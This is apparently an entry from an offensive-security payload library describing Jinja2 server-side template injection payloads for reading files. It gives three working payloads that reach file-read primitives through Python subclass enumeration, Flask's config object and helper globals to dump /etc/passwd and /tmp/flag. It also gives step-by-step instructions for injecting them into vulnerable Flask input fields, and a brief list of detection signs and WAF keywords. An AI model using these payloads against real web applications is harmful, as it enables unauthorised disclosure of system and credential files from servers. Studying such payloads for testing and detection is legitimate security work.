---
id: 85205fd9-8cad-4330-a5f8-2f436b032436
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:39.687769+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - ssti
  - jinja2
  - file-read
  - payload
platforms:
  - Web
validated: true
---

# Jinja2-SSTI-File-Read-via-Subclasses

## Code

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

## Description

This code snippet contains three Jinja2 SSTI payloads for reading arbitrary files on a server. The first uses object subclass enumeration to instantiate a File class and read /etc/passwd. The second accesses the File class via Flask's config global to read /tmp/flag. The third traverses Flask helper globals to reach builtins.open for reading /etc/passwd. These payloads exploit the template context to execute file I/O operations, disclosing sensitive data in the rendered output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| File Path (e.g., '/etc/passwd') | Path to the target file on the server | '/etc/passwd' or '/tmp/flag' |
| Subclass Index [40] | Index of the File class in subclasses() (may vary by Python version) | 40 (adjust if needed, e.g., probe with {{ ''.__class__.__mro__[2].__subclasses__() }}) |
| Config Index [4] | Index in config.items() to reach a usable object (Flask-specific) | 4 |

## Usage

Inject these payloads into a vulnerable Jinja2-rendered input field (e.g., a search box or template parameter in a Flask app). Submit via HTTP POST/GET and observe the response for file contents. Use a proxy like Burp Suite to craft and replay requests. Start with the first payload for broad compatibility; fall back to others if sandboxed. This is typically used after confirming SSTI with {{ 7*7 }}.

## Detection

- Web application logs showing template rendering errors or unusual {{ }} expressions.
- File access logs (e.g., auditd on Linux) for reads of sensitive paths like /etc/passwd by the web server user.
- WAF alerts on payloads containing __class__, __mro__, subclasses, or builtins.open.
- Response analysis for unexpected file content leakage in HTML/JSON outputs.

## Related

- [[procedures/Remote-File-Read-via-Jinja2-SSTI]]
